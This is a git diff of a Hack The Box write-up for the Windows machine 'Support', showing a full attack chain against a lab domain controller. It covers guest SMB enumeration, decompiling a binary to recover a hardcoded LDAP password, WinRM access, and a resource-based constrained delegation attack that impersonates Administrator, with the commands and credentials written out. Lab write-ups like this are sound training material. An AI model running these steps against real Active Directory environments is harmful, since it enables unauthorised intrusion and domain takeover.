@@ -9,7 +9,7 @@ Support is an Easy difficulty Windows machine that features an SMB share that al
 
 # Nmap Scan
 ### DC.support.htb
-```
+```bash
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-20 02:28:25Z)
@@ -38,7 +38,7 @@ Host script results:
 ```
 # Initital Enumeration
 Enumerating for null authentication and guest access revealed that `guest` user has read permissions on an unusual shares named `support-tools`. 
-```
+```bash
 ~/HTB/Windows/Support $ nxc smb DC -u '' -p '' --shares
 SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.129.230.181  445    DC               [+] support.htb\:
@@ -58,7 +58,7 @@ SMB         10.129.230.181  445    DC               support-tools   READ        
 SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share
 ```
 Accessing the `support-tools` share, I discovered `UserInfo.exe.zip`. This appears to be a custom domain utility, so I proceeded to download it for further analysis.
-```
+```bash
 ~/HTB/Windows/Support $ smbclient -U guest% //DC/support-tools
 Can't load /etc/samba/smb.conf - run testparm to debug it
 Try "help" to get a list of possible commands.
@@ -79,7 +79,7 @@ smb: \> get UserInfo.exe.zip
 getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (141.8 KiloBytes/sec) (average 141.8 KiloBytes/sec)
 ```
 Unzipped `UserInfo.exe.zip` to `UserInfo` directory.
-```
+```bash
 ~/HTB/Windows/Support $ unzip UserInfo.exe.zip -d UserInfo
 Archive:  UserInfo.exe.zip
   inflating: UserInfo/UserInfo.exe
@@ -96,7 +96,7 @@ Archive:  UserInfo.exe.zip
   inflating: UserInfo/UserInfo.exe.config
 ```
 Decompiled `UserInfo.exe` using `dnSpy` to investigate its functionality. Analyzing the `UserInfo.Services.LdapQuery` class revealed that the application attempts to establish an `LDAP` connection to `support.htb` using the `support\ldap` account.
-```
+```c#
 <SNIP>
 		public LdapQuery()
 		{
@@ -108,7 +108,7 @@ Decompiled `UserInfo.exe` using `dnSpy` to investigate its functionality. Analyz
 <SNIP>
 ```
 Further inspection of the `Protected.getPassword()` method identified a custom decryption routine. The binary obfuscates the LDAP password by performing a double `XOR` operation on a `Base64`-encoded string using a hardcoded key (`armando`) and the constant value `223`.
-```
+```c#
         internal class Protected
         {
                 // Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
@@ -132,7 +132,7 @@ Further inspection of the `Protected.getPassword()` method identified a custom d
 ```
 Replicated the logic on `CyberChef` (https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'armando'%7D,'Standard',false)XOR(%7B'option':'Decimal','string':'223'%7D,'Standard',false)&input=ME52MzJQVHdnWWp6ZzkvOGo1VGJtdlBkM2U3V2h0V1d5dVBzeU83Ni9ZK1UxOTNF&oeol=FF), and retrieved the cleartext password: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`.
 Authenticated to `LDAP` server with recovered credentials. Using the `get-info-users` module in `NetExec`, discovered `support` user whose `info` field contained a cleartext password.
-```
+```bash
 ~/HTB/Windows/Support $ nxc ldap DC -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M get-info-users
 LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert)
 LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
@@ -141,13 +141,13 @@ GET-INFO... 10.129.230.181  389    DC               User: support              I
 ```
 # Initial Foothold
 Established an interactive session via `Evil-WinRM`using the `support` account and retrieved the user flag.
-```
+```bash
 ~/HTB/Windows/Support $ evil-winrm -i DC -u support -p Ironside47pleasure40Watchful
 *Evil-WinRM* PS C:\Users\support\Documents> cat ..\Desktop\user.txt
 5cef8735b0e4ab38525a4bce4661252b
 ```
 Enumerated `AD` permissions using `BloodyAD`, which revealed that `support` possesses `GenericAll (DACL: WRITE)` privileges over the `DC$`.
-```
+```bash
 ~/HTB/Windows/Support $ bloodyad -u support -p Ironside47pleasure40Watchful -d support.htb -H DC.support.htb get writable
 <SNIP>
 distinguishedName: CN=DC,OU=Domain Controllers,DC=support,DC=htb
@@ -159,7 +159,7 @@ DACL: WRITE
 # Compromise support.htb
 To escalate to `Administrator`, I opted for a `Resource-Based Constrained Delegation (RBCD)` attack.
 First, created a new computer account named `exploit$` using `addcomputer.py`. Subsequently, configured the delegation by writing to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the `DC`.
-```
+```bash
 ~/HTB/Windows/Support $ addcomputer.py support.htb/support:Ironside47pleasure40Watchful -computer-name 'exploit$' -computer-pass Password123
 [*] Successfully added machine account exploit$ with password Password123.
 
@@ -171,7 +171,7 @@ First, created a new computer account named `exploit$` using `addcomputer.py`. S
 [*]     exploit$     (S-1-5-21-1677581083-3380853377-188903654-6101)
 ```
 Requested a Service Ticket for the `Administrator` user via the `S4U2Proxy` extension. After exporting the ticket to the environment, leveraged `winrmexec` to obtain a shell on the `DC` and retrieve the root flag.
-```
+```bash
 ~/HTB/Windows/Support $ getST.py support.htb/'exploit$':Password123 -spn http/DC.support.htb -impersonate Administrator
 [-] CCache file is not found. Skipping...
 [*] Getting TGT for user
